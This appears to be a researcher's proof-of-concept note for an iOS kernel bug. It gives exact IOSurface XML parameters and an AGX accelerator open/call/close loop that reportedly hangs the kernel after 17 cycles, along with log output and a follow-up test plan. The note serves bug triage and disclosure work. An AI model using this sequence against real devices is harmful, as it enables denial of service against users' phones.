# AGX reconnect hang — PoC

Target: iPhone14,7 / iOS 27.2 (24B115) / T8110.

## Sequence

1. Create the F1 IOSurface through `IOSurfaceRoot` selector 0 using the
   32-bit-wrap XML (alloc=0x10000, slices=4, dataPerSlice=0x4000,
   headerPerSlice=0x40000000, planeSize=0x10000).  Keep the
   `IOSurfaceRoot` connection open.
2. Loop:
   - `IOServiceOpen(AGXAcceleratorG14P, task, type=1)`.
   - `IOConnectCallMethod(conn, 8, NULL, 0, in, 0x100, ...)` with
     `in+0x00=0x82`, `in+0x38=F1 sid`, `in+0x3c=0`, all other fields 0.
   - `IOServiceClose(conn)`.
3. After 17 successful cycles, the next `IOServiceOpen` (cycle index 18)
   hangs.  The process is stuck in the kernel; the device stays
   responsive to AFC, so this is a hang, not a panic.

## Evidence

`RECONNECT_HANG.log` ends with:

```
[02:44:12.342] reconnect[16]: open conn=0x707b
[02:44:12.343] reconnect[16]: -> 0x0 va=0x1500000000 len=0x10000
[02:44:12.343] reconnect[16]: close
[02:44:12.399] reconnect[17]: open conn=0x7093
[02:44:12.400] reconnect[17]: -> 0x0 va=0x1500000000 len=0x10000
[02:44:12.401] reconnect[17]: close
```

There is no `reconnect[18]: open` line: the hang is in
`IOServiceGetMatchingService` / `IOServiceOpen` / `IOObjectRelease`
before the log write.

## Interpretation

The 4 GiB declared header region is attached to the F1 surface.  Each
AGX connection creates a resource from the same surface and then closes;
after 17 cycles the AGX open path blocks.  Likely a resource/refcount
leak or lock imbalance in the AGX user-client/resource teardown, with
the wrapped surface as the trigger.

This is a **DoS / resource leak**, not kernel R/W.  It is still a new
kernel/IOGPU bug candidate: repeatable user-triggered hang after a small,
fixed number of AGX open/map/close cycles.

## Next check

Run the same loop with a normal 64x64 BGRA surface (no F1 wrap).  If the
normal surface does not hang, the F1 wrapped geometry is the trigger and
the parser bug has a demonstrable impact beyond the inert metadata.

## Source

`02_KERNEL/xmlfuzz/target.m`, function `reconnect_test()`.
The installed app is `XMLTarget-signed.ipa`; it runs the loop before the
other tests.
